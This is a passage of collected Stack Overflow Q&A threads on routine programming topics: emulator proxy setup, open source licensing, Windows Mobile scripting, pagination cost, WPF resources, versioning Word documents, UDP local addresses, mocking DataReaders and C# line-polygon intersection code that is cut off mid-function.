<li>Go to wireless and networks</li>
<li>Go to mobile networks</li>
<li>Go to access point names. Use menu to add new apns</li>
<li>Set Proxy = localhost</li>
<li>Set Port = port that you are using to make proxy server, in my case it is 8989</li>
</ul>

<p>For setting Name and apn here is the link:</p>

<p>According to your sim card you can see the table</p>
 <p>I had the same problem when i use the following command:</p>

<pre><code>emulator-x86.exe -http-proxy domain\user:password@proxyIP:port -avd MyAVD
</code></pre>

<p>I got the proxy authentication error.</p>

<p>Finally, I had to bypass the proxy NTLM authentication by using the Cntlm here:</p>

<p><a href=""http://sourceforge.net/projects/cntlm/"" rel=""nofollow"">http://sourceforge.net/projects/cntlm/</a></p>

<p>And then after simply configuring the cntlm.ini, I use the following command instead:</p>

<pre><code>emulator-x86.exe -http-proxy 127.0.0.1:3128 -avd MyAVD
</code></pre>

<p>and it works :)</p>
"
"Corporate-Friendly Open Source Licenses <p>What open source licenses are more corporate-friendly, i.e., they can be used in commercial products without the need to open source the commercial product?</p>
 <p>The two most commonly used licenses that allow what you want are the <a href=""http://www.opensource.org/licenses/bsd-license.php"" rel=""nofollow"">BSD License</a> and 
<a href=""http://www.opensource.org/licenses/mit-license.php"" rel=""nofollow"">MIT License</a>. (see also the full <a href=""http://www.opensource.org/licenses"" rel=""nofollow"">list of licenses</a> considered Open Source by the OSI).</p>
 <p>The <a href=""http://en.wikipedia.org/wiki/GNU_Lesser_General_Public_Licence"" rel=""nofollow"">GNU Lesser General Public Licence</a> is also corporate-friendly and quite often used in libraries. It allows for <em>usage</em> of a certain library but modifications to it should be made public.</p>
 <p>As a possible alternative to the BSD license you can also use the <a href=""http://www.opensource.org/licenses/ms-pl.html"" rel=""nofollow"">Ms-PL</a> license (Microsoft public license). Pretty much the same but (arguably) better worded. Additionally, It's got “Microsoft” in its name, which screams “corprate-friendly” like nothing else does. ;-)</p>
 <p>By ""corporate"" I tend to think of internal development, programs distributed only to people that are employed by the same company. In that sense, pretty much all free software licences are ""corporate-friendly.""</p>

<p>However, in terms of distributing closed-source software that contains free software the only big one (off the top of my head) that is excluded is the GPL. You could embed LGPL, BSD, MIT, Artistic licenced code. The ""price"" might be having to give credit, but that would be way cheaper than actually writing and debugging the software.</p>

<p>Things can get hazy when you consider licences that try to protect trademarks (Mozilla) or the compatibility of a broader range of software (Sun). Your constraints are not always only related to the distribution of the code.</p>

<p>In summary, if you're unsure you should consult a lawyer.</p>
 <p>Basically, only the GPL requires that the whole product is GPL, and LGPL implies that the parts specific to that library be open sourced. But, for both, the problem arises only when you distribute the application.</p>

<p>For all the other open source licenses, the only common requirement is the publicity (ie. show at some point to the user what open source component / library is used).</p>

<p>After that you have the ""no competing commercial product"" licenses...</p>

<p>All in all, the most acknowledged business friendly license are IMHO the <a href=""http://www.opensource.org/licenses/apache2.0.php"" rel=""nofollow"">Apache License</a>, the <a href=""http://www.opensource.org/licenses/artistic-license-2.0.php"" rel=""nofollow"">Artistic License</a> and the <a href=""http://www.opensource.org/licenses/mozilla1.1.php"" rel=""nofollow"">Mozilla Public license</a>. </p>

<p>Furthermore, even if <a href=""http://creativecommons.org/about/license/"" rel=""nofollow"">Creative Commons</a> is not widely used for software development, some options are business friendly.</p>

<p>Edit: forgot <a href=""http://www.opensource.org/licenses/bsd-license.php"" rel=""nofollow"">BSD</a> (which is more a license-template than a license) and <a href=""http://www.opensource.org/licenses/mit-license.php"" rel=""nofollow"">MIT</a> mentionned by Daniel. It seems to me that their usages are fading away, but there is some license tropism to take in account according to the development language / open source sub-community.</p>
 <p>Ideally I looked for components licensed under the <a href=""http://www.apache.org/licenses/"" rel=""nofollow"">Apache Software License</a>. After that LGPL, BSD and Artistic License are my next preferences. </p>
 <p>I recommend the Apache License (specifically, version 2).  It is not a “copy left” license and it addresses several matters that are important to established companies and their lawyers.</p>

<p>“Copy left” is the philosophy of the free software foundation requiring anything incorporating the licensed opens source code to also be licensed as open source.  That philosophy is regarded as poison by established companies that want to keep their products proprietary.</p>

<p>Aside from not having “copy left” provisions, the Apache license specifically addresses the grant of rights from project contributors and it expressly addresses the fact that modern companies are typically made up for more than one legal entity (for example, a parent company and its subsidiaries).  Most open source licenses don’t address these points.</p>

<p>Whatever license you choose, if you want your code to be “corporate friendly,” in the sense that you want it to be incorporated into commercial, non-open source products, it is essential that you avoid GPL and other “copy left” type licenses.  While it would be best to consult with your own lawyer before investing time or money in a project for which this is an important factor, a quick shorthand for licenses that are and are not “copy left” can be found on the Free Software Foundation’s website.  They identify which licenses they don’t find meet their standards as “copy left.”  The ones FSF rejects are most likely the ones that will be corporate friendly in this sense.</p>

<p>(Although the question didn’t ask this, it is worth mentioning that, with very few exceptions, even GPL and other “copy left” type licenses are perfectly corporate friendly if they are only used internally by the commercial entities and not incorporated into their products.)</p>
 <p>I believe that 6 of the 9 licenses on the OSI's list of ""Licenses that are popular and widely used or with strong communities"" meet your criterion: Apache, BSD, MIT, Mozilla, CPL, and Eclipse. The Mozilla license and CPL (the Common Public License) have language concerning patents that might make them more attractive to corporations.</p>

<p><a href=""http://www.opensource.org/licenses/category"" rel=""nofollow"">See here</a> for more information. </p>
 <p>MIT, Apache and BSD tend to be the most corporate friendly. The least corporate friendly that I have ran across are usually Q Public, GPL and Mozilla...</p>
 <p>Wikipedia also has a very useful <a href=""http://en.wikipedia.org/wiki/Comparison_of_free_software_licences"" rel=""nofollow"">list that compares all the free software licenses</a>. If you have a green box on the right (""Release changes under a different license""), I think that's all you need. </p>
"
"Windows Mobile - What scripting platforms are available? <p>We have a number of users with Windows Mobile 6 and need to apply minor changes. eg. update a registry setting. One option is push and execute an executable file using our device management software.</p>

<p>I'd like this to be a little more friendly for the admins who are familiar with scripting in VBScript/JScript etc. What are the options for scripting on Windows Mobile devices?</p>
 <p>I work on windows mobile full time and have never really come across a good Windows Mobile scripting implementation unfortunately.  For some reason MS has never seen the need for it.  For example, even though you can actually get a command console on WM, it does not support running batch files, even though all the commands are still there and it would be relatively easy.  There is definitely not a VBScript engine I've ever heard of nor JScript.  There is <a href=""http://pythonce.sourceforge.net/"" rel=""nofollow"">PythonCE</a> but the WM specific support is minimal and you don't get access to a lot of WM only things.</p>

<p>Also, I've done a lot of work with a company called <a href=""http://soti.net/"" rel=""nofollow"">SOTI</a> which has a product called MobiControl that does incorporate a basic scripting engine. Though most of the commands are specific to their system and actually have to be run from a desktop-side management console.</p>

<p>Given all of the times I have tried to find a good scripting engine for WM myself you would think I would've just written one ;)</p>

<p>So, sorry, but the basic answer is <em>no</em>, there is not a scripting engine available for VB in the context that you specified.</p>
 <p>The closest thing to a scripting environment on Windows Mobile is the Configuration Service Provider interface.  While it is not a scripting language <em>per se</em>, it does allow one to do a lot of the same type of things such as modify registry settings, copy and delete files and directories, install and uninstall applications and much more.</p>

<p>Mike Calligaro has <a href=""http://msdn.microsoft.com/en-us/magazine/cc500581.aspx"" rel=""nofollow"">a great article</a> on how to write scripts and how to get them from your desktop onto the device in various ways.  One of them is certain to work for you.</p>
 <p>Once option that the devs over at xda-developers seem to enjoy is <a href=""http://www.sto-helit.de/index.php?module=page&amp;entry=ms_overview&amp;action=view"" rel=""nofollow"">Mortscript</a></p>

<p>I have never bothered to use it, but I have used many cab installers that distribute mortscript so that they can do various tasks</p>
 <p>There is also a <a href=""http://www.cebeans.com/"" rel=""nofollow"">Visual Basic Runtime</a> to run VBScript</p>
 <p><b>Try Lua:</b><br>
Oficial Lua page: <a href=""http://www.lua.org/"" rel=""nofollow"">http://www.lua.org/</a> <br>
Lua WinCe / Mobile port: <a href=""http://www.magma.com.ni/sw/wince/lua/"" rel=""nofollow"">http://www.magma.com.ni/sw/wince/lua/</a></p>
"
"Why is pagination so resource-expensive? <p>It's one of those things that seems to have an odd curve where the more I think about it, the more it makes sense.  To a certain extent, of course.  And then it doesn't make sense to me at all.</p>

<p>Care to enlighten me?</p>
 <p>Because in most cases you've got to sort your results first. For example, when you search on Google, <a href=""http://www.google.com.au/search?hl=en&amp;safe=off&amp;q=google&amp;start=1000&amp;sa=N"" rel=""nofollow"">you can view only up to 100 pages of results</a>. They don't bother sorting by page-rank beyond 1000 websites for given keyword (or combination of keywords).</p>

<p><strong>Pagination is fast. Sorting is slow.</strong></p>
 <p>This is a really vague question. We'd need a concrete example to get a better idea of the problem.</p>
 <p><a href=""http://stackoverflow.com/questions/29580/why-is-pagination-so-resource-expensive#29588"" rel=""nofollow"">Lubos</a> is right, the problem is not the fact that you are paging (which takes a HUGE amount of data off the wire), but that you need to figure out what is actually going on the page..</p>

<p>The fact that you need to page implies there is a lot of data. A lot of data takes a long time to sort :)</p>
 <p>I thought you meant <a href=""http://en.wikipedia.org/wiki/Pagination"" rel=""nofollow"">pagination of the printed page</a> - that's where I cut my teeth.  I was going to enter a great monologue about collecting all the content for the page, positioning (a vast number of rules here, constrait engines are quite helpful) and justification... but apparently you were talking about the process of organizing information on webpages.  </p>

<p>For that, I'd guess database hits.  Disk access is slow.  Once you've got it in memory, sorting is cheap.</p>
 <p>Of course sorting on a random query takes some time, but if you're having problems with the same paginated query being used regulary, there's either something wrong with the database setup (improperly indexing/none at all, too little memory etc. I'm not a db-manager) or you're doing pagination seriously wrong: </p>

<p>Terribly wrong: e.g. doing <code>select * from hugetable where somecondition;</code> into an array getting the page count with the array.length pick the relevant indexes and dicard the array - then repeating this for each page... That's what I call seriously wrong. </p>

<p>The better solution two queries: one getting just the count then another getting results using <code>limit</code> and <code>offset</code>. (Some proprietary, nonstandard-sql server might have a one query option, I dunno)</p>

<p>The bad solution might actually work quite okay in on small tables (in fact it's not unthinkable that it's faster on very small tables, because the overhead of making two queries is bigger than getting all rows in one query. I'm not saying it <em>is</em> so...) but as soon as the database begins to grow the problems become obvious.</p>
 <p>This question seems pretty well covered, but I'll add a little something MySQL specific as it catches out a lot of people:</p>

<p>Avoid using <code>SQL_CALC_FOUND_ROWS</code>. Unless the dataset is trivial, counting matches and retrieving x amount of matches in two separate queries is going to be a lot quicker. (If it <em>is</em> trivial, you'll barely notice a difference either way.)</p>
"
"Can someone point me to some guides for WPF <p>I am having trouble finding good guides for WPF.<br />
I have experience in C# and .NET but  I don't know anything about WPF except for the regular marketing-ish description of the technology as a whole.<br />
Can anyone point me to a good beginner's tutorial/guide on WPF.</p>
 <p>I would buy a book - the Adam Nathan WPF book is good.</p>

<p><a href=""http://rads.stackoverflow.com/amzn/click/0672328917"" rel=""nofollow"">http://www.amazon.com/Windows-Presentation-Foundation-Unleashed-WPF/dp/0672328917</a></p>
 <p><P>Ok, in terms of reading material, this is the pick of the books out there: <A href=""http://rads.stackoverflow.com/amzn/click/0672328917"" rel=""nofollow"">Windows Presentation Foundation Unleashed</A>.</P></p>

<p><P>For blogs, there are a lot of blogs and&nbsp;articles on <A href=""http://windowsclient.net/"" rel=""nofollow"">WindowsClient.net</A>, and there's an excellent blog all about data binding in WPF by <A href=""http://www.beacosta.com/blog/"" rel=""nofollow"">Beatriz Costa</A>. Also take a look at <A href=""http://learnwpf.com/"" rel=""nofollow"">LearnWPF.com</A> and <A href=""http://www.drwpf.com/blog/"" rel=""nofollow"">Ask Dr. WPF</A>.</P></p>
 <p>Here are a few ""How Do I"" videos to get you started:</p>

<p><a href=""http://windowsclient.net/learn/videos_wpf.aspx"" rel=""nofollow"">http://windowsclient.net/learn/videos_wpf.aspx</a></p>
 <p>Scott Hanselmann has blogged extensively about his experience in learning WPF by creating his 'BabySmash' windows application. All the source code is on codeplex and he has many blog articles describing his progress.</p>

<p><a href=""http://www.hanselman.com/blog/IntroducingBabySmashAWPFExperiment.aspx"" rel=""nofollow"">Initial BabySmash article</a></p>

<p><a href=""http://www.codeplex.com/babysmash/SourceControl/ListDownloadableCommits.aspx"" rel=""nofollow"">Codeplex source</a></p>

<p><a href=""http://www.hanselman.com/babysmash/"" rel=""nofollow"">BabySmash website</a></p>
 <p>Programming WPF by Chris Sells and Ian Griffiths is an excellent way to learn WPF.  5 star rated on Amazon with 50+ reviews.  <a href=""http://rads.stackoverflow.com/amzn/click/0596510373"" rel=""nofollow"">http://www.amazon.com/Programming-WPF-Chris-Sells/dp/0596510373</a></p>
 <p>Sacha Barber has a great series of articles on WPF for Beginners over at Codeproject that you can check out.</p>

<ul>
<li><a href=""http://www.codeproject.com/KB/WPF/BeginWPF1.aspx"" rel=""nofollow"">An Introduction to the WPF Layout System</a></li>
<li><a href=""http://www.codeproject.com/KB/WPF/BeginWPF2.aspx"" rel=""nofollow"">An introduction into XAML / code and WPF resources</a></li>
<li><a href=""http://www.codeproject.com/KB/WPF/BeginWPF3.aspx"" rel=""nofollow"">An introduction into RoutedEvents / RoutedCommands</a></li>
<li><a href=""http://www.codeproject.com/KB/WPF/BeginWPF4.aspx"" rel=""nofollow"">An introduction into WPF Dependancy Properties</a></li>
<li><a href=""http://www.codeproject.com/KB/WPF/BeginWPF6.aspx"" rel=""nofollow"">An introduction into WPF Styles And Templates</a></li>
</ul>
 <p>Have a look at the <a href=""http://joshsmithonwpf.wordpress.com/a-guided-tour-of-wpf/"" rel=""nofollow"">Guided tour of WPF</a> by Josh Smith. I also really like Adam's Nathan book WPF Presentation Unleashed.</p>
 <p>There are some WPF getting started guides here: <a href=""http://msdn.microsoft.com/en-us/library/ms742119.aspx"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/ms742119.aspx</a> </p>
"
"Is version control (ie. Subversion) applicable in document tracking? <p>I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. </p>

<p>What I am doing now is looking up the ""date modified"" in the shared folder, opened up recent modified documents and use the ""Track Change"" function in MS Word to apply the changes. I find this a bit tedious.</p>

<p>So will it be better and easier if I commit this in a version control database?</p>

<p>Basically I want to keep different version of a file.</p>

<p><hr>
What have I learn from answers:</p>

<ul>
<li><p>Use Time Machine to save different
version (or Shadow copy in Vista)</p></li>
<li><p>There is a difference between text
and binary documents when you use
version control app. (I didn't know
that)</p></li>
<li><p>Diff won't work on binary files</p></li>
<li><p>A notification system (ie email) for revision is great</p></li>
<li><p>Google Docs revision feature.</p></li>
</ul>

<p><strong>Update</strong> : </p>

<p>I played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). </p>

<p>But what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google? </p>
 <p>You could do that, but if that files are binary you should always put a lock on it before editing. You won't get a conflict (which would be unresolvable).</p>
 <p>You can, but you will allways compare the document versions with Word itself.</p>

<p>I haven't heard a version control database which can track changes in Word documents.</p>

<p>However there are some tools which can compare Word documents, so if you set up your version control client to use these tools for comparison, you can have some fun.</p>
 <p>Not necessarily. It depends on how often the new files are committed to the repo. If the files are edited several times before a commit, then you're precisely where you are now. The biggest benefit is if the file becomes corrupted.</p>

<p>You can version any file; this is how Time Machine in Mac OS X Leopard works, for example, and there is an interesting article by someone who committed his entire computing environment into CVS and then just maintained working copies on his home and work machines.</p>

<p>But ""better"" and ""easier"" are specific to your situation, and I'm not sure I completely understand your problem as things stand.</p>
 <p>I guess one thing that nobody seems to have asked is if you have a legal requirement to store history of changes to the doc's?</p>

<p>Whether you do or don't is going to have an impact on what solutions you can consider.</p>

<p>Also a notification mechanism for out of date copies is also a bundle of fun. If engineer A has a copy of a document and engineer B then edits it and commits the changes you want engineer A to be notified that his copy is out of date.</p>

<p>Document control can become a real can of worms quite easily.</p>

<p>Maybe keep the doc's under CVS or SVN and set it up so that emails are generated to whoever has checked out a copy when updates for the same doc. are checked in to the repository?</p>

<p>Edit: I forgot to add don't forget to use the binary switch, e.g. -kb for CVS, when adding the new doc. Otherwise, you will get any sequences of data that happen to match the ascii for keyword strings having the relevant config management data appended thereby corrupting your doc. data.</p>
 <p>Subversion, CVS and all other source control systems are not good for Word documents and other office files (such as Excel spread sheets), since the files themselves are stored in a binary format. That means that you can never go back and annotate (or blame, or whatever you want to call it), or do diffs between documents.</p>

<p>There are revision control systems for Word documents out there, unfortunately I do not know any good ones. We use such control systems for Excel at my work, and unfortunately they all cost money.</p>

<p>The good thing is that they make life a lot easier, especially if you ever have to do an audit or due diligence.</p>
 <p>Thinking out of the box, would migrating to a Wiki be out of the question?</p>

<p>Since you consider it feasible to force your users into Subversion (or something similar), a larger change seem acceptable.</p>

<p>Another migration target could be to use some kind of structured XML document format (<a href=""http://www.docbook.org/"">DocBook</a> comes to mind). This would enable you to indeed use diffs and source control, while getting all sorts of document formats for free.</p>
 <p>I've worked with Word documents in SVN. With <a href=""http://tortoisesvn.tigris.org/"">TortoiseSVN</a>, you can easily diff Word documents (between working copy and repository, or between two repository revisions). It's really slick and definitely recommended.</p>

<p>The other thing to do if you're using Word documents in SVN is to add the <a href=""http://svnbook.red-bean.com/en/1.2/svn.advanced.locking.html"">svn:needs-lock</a> property to the Word documents. This will prevent two people from trying to edit the same document at the same time, since unfortunately there's no good way to merge Word documents.</p>

<p>With the above two things, handling revision controlled Word documents is at least tolerable. It certainly beats the alternative of using a shared folder and track-changes.</p>
 <p>If you use <a href=""http://winmerge.org/"" rel=""nofollow"">WinMerge</a> it has added support for merging Word and Excel binary files.</p>
 <p><a href=""http://office.microsoft.com/en-us/sharepointtechnology/default.aspx"">Sharepoint</a> also does a good (ok decent) job of versioning MS-specific documents.</p>
 <p>What on Earth are you all Word-is-binary-so-no-diff people talking about? TortoiseSVN, for example, integrates right out of the box with Word and enables you to use Word's built-in diff and merge functionality. It works just fine.</p>

<p>I have worked on projects that store documents in version control. It has worked out pretty well, although if people are unfamiliar with version control, they are probably going to have conceptual difficulties with things like ""working copy"" and ""merge"" and ""conflict"". Don't overestimate the users' capabilities when you plan your document management system.</p>

<p>I believe there exist big and powerful commercial solutions for all of this, as well. I'm sure if you have enough kilodollars, you can get something that fits your needs perfectly. Document management systems are a big business for big enterprise.</p>
 <p>Have a look at Sharepoint. If cost is an issue, Sharepoint portal sevices can also work for you. <a href=""http://www.isaserver.org/img/upl/spskit/1overview/1overview.htm"" rel=""nofollow"">Read this</a> for more info</p>
 <p>For what it's worth, there is also <a href=""http://docs.google.com/"" rel=""nofollow"">Google Docs</a>. I guess it's not a perfect fit, but it's versioning is <strong>very</strong> convenient. </p>
 <p>Just wanted to clarify an answer someone gave but I don't have enough points yet.</p>

<p>diff will work on binary files but it is only going to say something not really useful like ""toto1 and toto2 binary files differ"".</p>
 <p>Many of the new version control projects are better suited to entire directories, and not so much for single files.</p>

<p>Convincing someone that they need to get an entire project, when they only want to update an individual file can be a ""fun"" way to spend an afternoon.</p>
 <p>Another option you have is a piece of software and cloud computing magic called dropbox. Or, you could ditch the word documents and make a locally shared mediawiki instead.</p>

<p>DropBox:
getdropbox DOT com</p>

<p>MediaWiki:
mediawiki DOT org</p>
 <p>Clearcase integrates with Word for revision tracking. I believe Telelogic DOORs does as well.</p>
 <p>How about trying <code>git</code> , It seems git can support word <code>.doc</code> and open document <code>.odf</code> files if you configure it in <code>.gitattributes</code> file.</p>

<p>Here is a <a href=""http://git-scm.com/book/en/Customizing-Git-Git-Attributes"" rel=""nofollow"">reference</a> , Scroll down to <code>diff</code>ing binary files .</p>
 <p>I use Mercurial with the TortoiseHg overlay. I can right-click a changeset, choose ""Visual Diff"", then choose the ""docdiff"" tool (comes bundled), which launches the document in Word with the Track Changes. </p>
 <p>You could use something like the Revisionator, which is like google docs but with built in revision control including diffs, forks, and 3 way merges. <a href=""http://revisionator.com"" rel=""nofollow"">http://revisionator.com</a></p>

<p>UPDATE: It also fixes the problem of too frequent autosaving that you mention with Google Docs. It'll still autosave to prevent data loss, but it will only create a new version in the revision history and share with other users when you explicitly ""release"" your changes. </p>
"
"How to get your own (local) IP-Address from an udp-socket (C/C++) <ol>
<li>You have multiple network adapters.</li>
<li>Bind a UDP socket to an local port, without specifying an address.</li>
<li>Receive packets on one of the adapters.</li>
</ol>

<p>How do you get the local ip address of the adapter which received the packet?</p>

<p>The question is, ""What is the ip address from the receiver adapter?"" not the address from the sender which we get in the </p>

<pre><code>receive_from( ..., &amp;senderAddr, ... );
</code></pre>

<p>call.</p>
 <pre>
ssize_t
     recvfrom(int socket, void *restrict buffer, size_t length, int flags,
         struct sockaddr *restrict address, socklen_t *restrict address_len);

     ssize_t
     recvmsg(int socket, struct msghdr *message, int flags);

[..]
     If address is not a null pointer and the socket is not connection-oriented, the
     source address of the message is filled in.
</pre> 

<p>Actual code:</p>

<p><code>
int nbytes = recvfrom(sock, buf, MAXBUFSIZE, MSG_WAITALL, (struct sockaddr *)&amp;bindaddr, &amp;addrlen);</p>

<p>fprintf(stdout, ""Read %d bytes on local address %s\n"", nbytes, inet_ntoa(bindaddr.sin_addr.s_addr));
</code></p>

<p>hope this helps.</p>
 <p>You could enumerate all the network adapters, get their IP addresses and compare the part covered by the subnet mask with the sender's address.</p>

<p>Like:</p>

<pre><code>IPAddress FindLocalIPAddressOfIncomingPacket( senderAddr )
{
    foreach( adapter in EnumAllNetworkAdapters() )
    {
        adapterSubnet = adapter.subnetmask &amp; adapter.ipaddress;
        senderSubnet = adapter.subnetmask &amp; senderAddr;
        if( adapterSubnet == senderSubnet )
        {
            return adapter.ipaddress;
        }
    }
}
</code></pre>
 <p>G'day,</p>

<p>I assume that you've done your bind using INADDR_ANY to specify the address.</p>

<p>If this is the case, then the semantics of INADDR_ANY is such that a UDP socket is created on the port specified on all of your interfaces. The socket is going to get all packets sent to all interfaces on the port specified.</p>

<p>When sending using this socket, the lowest numbered interface is used. The outgoing sender's address field is set to the IP address of that first outgoing interface used.</p>

<p>First outgoing interface is defined as the sequence when you do an ifconfig -a. It will probably be eth0.</p>

<p>HTH.</p>

<p>cheers,
Rob</p>
 <p>The solution provided by <a href=""http://stackoverflow.com/users/1810/timbo"">timbo</a> assumes that the address ranges are unique and not overlapping. While this is usually the case, it isn't a generic solution.</p>

<p>There is an excellent implementation of a function that does exactly what you're after provided in the Steven's book ""Unix network programming"" (section 20.2)
This is a function based on recvmsg(), rather than recvfrom(). If your socket has the IP_RECVIF option enabled then recvmsg() will return the index of the interface on which the packet was received. This can then be used to look up the destination address.</p>

<p>The source code is available <a href=""http://www.kohala.com/start/unp.tar.Z"" rel=""nofollow"">here</a>. The function in question is 'recvfrom_flags()'</p>
 <p>Try this:</p>

<pre><code>gethostbyname(""localhost"");
</code></pre>
 <p>Unfortunately the sendto and recvfrom API calls are fundamentally broken when used with sockets bound to ""Any IP"" because they have no field for local IP information. </p>

<p>So what can you do about it? </p>

<ol>
<li>You can guess (for example based on the routing table).</li>
<li>You can get a list of local addresses and bind a seperate socket to each local address. </li>
<li>You can use newer APIs that support this information. There are two parts to this, firstly you have to use the relavent socket option (ip_recvif for IPv4, ipv6_recvif for IPv6) to tell the stack you want this information. Then you have to use a different function (recvmsg on linux and several other unix-like systems, WSArecvmsg on windows) to receive the packet. </li>
</ol>

<p>None of these options are great. Guessing will obviously produce wrong answers soemtimes. Binding seperate sockets increases the complexity of your software and causes problems if the list of local addresses changes will your program is running. The newer APIs are the correct techical soloution but may reduce portability <s>(in particular it looks like WSArecvmsg is not available on windows XP)</s> and may require modifications to the socket wrapper library you are using.</p>

<p>Edit looks like I was wrong, it seems the MS documentation is misleading and that WSArecvmsg is available on windows XP. See <a href=""http://stackoverflow.com/a/37334943/5083516"">http://stackoverflow.com/a/37334943/5083516</a></p>
"
"How should I test a method that populates a list from a DataReader? <p>So I'm working on some legacy code that's heavy on the manual database operations. I'm trying to maintain some semblance of quality here, so I'm going TDD as much as possible.</p>

<p>The code I'm working on needs to populate, let's say a <code>List&lt;Foo&gt;</code> from a DataReader that returns all the fields required for a functioning Foo. However, if I want to verify that the code in fact returns one list item per one database row, I'm writing test code that looks something like this:</p>

<pre><code>Expect.Call(reader.Read()).Return(true);
Expect.Call(reader[""foo_id""]).Return((long) 1);
// ....
Expect.Call(reader.Read()).Return(true);
Expect.Call(reader[""foo_id""]).Return((long) 2);
// ....
Expect.Call(reader.Read()).Return(false);
</code></pre>

<p>Which is rather tedious and rather easily broken, too. </p>

<p>How should I be approaching this issue so that the result won't be a huge mess of brittle tests?</p>

<p>Btw I'm currently using Rhino.Mocks for this, but I can change it if the result is convincing enough. Just as long as the alternative isn't TypeMock, because their EULA was a bit too scary for my tastes last I checked.</p>

<p>Edit: I'm also currently limited to C# 2.</p>
 <p>You can put the Foo instances in a list and compare the objects with what you read:  </p>

<pre><code>var arrFoos = new Foos[]{...}; // what you expect
var expectedFoos = new List&lt;Foo&gt;(arrFoos); // make a list from the hardcoded array of expected Foos
var readerResult = ReadEntireList(reader); // read everything from reader and put in List&lt;Foo&gt;
Expect.ContainSameFoos(expectedFoos, readerResult); // compare the two lists
</code></pre>
 <p>Kokos,</p>

<p>Couple of things wrong there. First, doing it that way means I have to construct the Foos first, then feed their values to the mock reader which does nothing to <em>reduce</em> the amount of code I'm writing. Second, if the values pass through the reader, the Foos won't be the <em>same</em> Foos (reference equality). They might be <em>equal</em>, but even that's assuming too much of the Foo class that I don't dare touch at this point.</p>
 <p>To make this less tedious, you will need to encapsulate/refactor the mapping between the DataReader and the Object you hold in the list.  There is quite of few steps to encapsulate that logic out.  If that is the road you want to take, I can post code for you.  I am just not sure how practical it would be to post the code here on StackOverflow, but I can give it a shot to keep it concise and to the point.  Otherwise, you are stuck with the tedious task of repeating each expectation on the index accessor for the reader.  The encapsulation process will also get rid of the strings and make those strings more reusable through your tests.</p>

<p>Also, I am not sure at this point how much you want to make the existing code more testable.  Since this is legacy code that wasn't built with testing in mind.</p>
 <p>Just to clarify, you want to be able to test your call into SQL Server returned some data, or that if you had some data you could map it back into the model?</p>

<p>If you want to test your call into SQL returned some data checkout my answer found <a href=""http://stackoverflow.com/questions/12374/has-anyone-had-any-success-in-unit-testing-sql-stored-procedures#25204"" rel=""nofollow"">here</a></p>
 <p>@Toran: What I'm testing is the programmatic mapping from data returned from the database to quote-unquote domain model. Hence I want to mock out the database connection. For the other kind of test, I'd go for all-out integration testing.</p>

<p>@Dale: I guess you nailed it pretty well there, and I was afraid that might be the case. If you've got pointers to any articles or suchlike where someone has done the dirty job and decomposed it into more easily digestible steps, I'd appreciate it. Code samples wouldn't hurt either. I do have a clue on how to approach that problem, but before I actually dare do that, I'm going to need to get other things done, and if testing that will require tedious mocking, then that's what I'll do.</p>
 <p>I thought about posting some code and then I remembered about JP Boodhoo's Nothin But .NET course.  He has a <a href=""http://code.google.com/p/jpboodhoo/"" rel=""nofollow"">sample project</a> that he is sharing that was created during one of his classes.  The project is hosted on <a href=""http://code.google.com/"" rel=""nofollow"">Google Code</a> and it is a nice resource.  I am sure it has some nice tips for you to use and give you ideas on how to refactor the mapping.  The whole project was built with TDD.</p>
"
"How to know if a line intersects a plane in C#? - Basic 2D geometry <p>my school maths are very rusty and I think this is a good opportunity to take advance of this community :D</p>

<p>I have two points (a line) and a rectangle, I would like to know how to calculate if the line intersects the rectangle, my first approach had so many ""if"" statements that the compiler sent me a link to this site.</p>

<p>Thanks for your time!</p>
 <p>Do <a href=""http://mathworld.wolfram.com/Line-LineIntersection.html"" rel=""nofollow"">http://mathworld.wolfram.com/Line-LineIntersection.html</a> for the line and each side of the rectangle.<br />
Or: <a href=""http://mathworld.wolfram.com/Line-PlaneIntersection.html"" rel=""nofollow"">http://mathworld.wolfram.com/Line-PlaneIntersection.html</a></p>
 <p>From my ""Geometry"" class:</p>

<pre><code>public struct Line
{
    public static Line Empty;

    private PointF p1;
    private PointF p2;

    public Line(PointF p1, PointF p2)
    {
        this.p1 = p1;
        this.p2 = p2;
    }

    public PointF P1
    {
        get { return p1; }
        set { p1 = value; }
    }

    public PointF P2
    {
        get { return p2; }
        set { p2 = value; }
    }

    public float X1
    {
        get { return p1.X; }
        set { p1.X = value; }
    }

    public float X2
    {
        get { return p2.X; }
        set { p2.X = value; }
    }

    public float Y1
    {
        get { return p1.Y; }
        set { p1.Y = value; }
    }

    public float Y2
    {
        get { return p2.Y; }
        set { p2.Y = value; }
    }
}

public struct Polygon: IEnumerable&lt;PointF&gt;
{
    private PointF[] points;

    public Polygon(PointF[] points)
    {
        this.points = points;
    }

    public PointF[] Points
    {
        get { return points; }
        set { points = value; }
    }

    public int Length
    {
        get { return points.Length; }
    }

    public PointF this[int index]
    {
        get { return points[index]; }
        set { points[index] = value; }
    }

    public static implicit operator PointF[](Polygon polygon)
    {
        return polygon.points;
    }

    public static implicit operator Polygon(PointF[] points)
    {
        return new Polygon(points);
    }

    IEnumerator&lt;PointF&gt; IEnumerable&lt;PointF&gt;.GetEnumerator()
    {
        return (IEnumerator&lt;PointF&gt;)points.GetEnumerator();
    }

    public IEnumerator GetEnumerator()
    {
        return points.GetEnumerator();
    }
}

public enum Intersection
{
    None,
    Tangent,
    Intersection,
    Containment
}

public static class Geometry
{

    public static Intersection IntersectionOf(Line line, Polygon polygon)
    {
        if (polygon.Length == 0)
        {
            return Intersection.None;
        }
        if (polygon.Length == 1)
        {
            return IntersectionOf(polygon[0], line);
        }
        bool tangent = false;
        for (int index = 0; index &lt; polygon.Length; index++)
        {
            int index2 = (index + 1)%polygon.Length;
            Intersection intersection = IntersectionOf(line, new Line(polygon[index], polygon[index2]));
            if (intersection == Intersection.Intersection)
            {
                return intersection;
            }
            if (intersection == Intersection.Tangent)
            {
                tangent = true;
            }
        }
        return tangent ? Intersection.Tangent : IntersectionOf(line.P1, polygon);
    }

    public static Intersection IntersectionOf(PointF point, Polygon polygon)
    {
        switch (polygon.Length)
        {
            case 0:
                return Intersection.None;
            case 1:
                if (polygon[0].X == point.X &amp;&amp; polygon[0].Y == point.Y)
                {
                    return Intersection.Tangent;
                }
                else
                {
                    return Intersection.None;
                }
            case 2:
                return IntersectionOf(point, new Line(polygon[0], polygon[1]));
        }

        int counter = 0;
        int i;
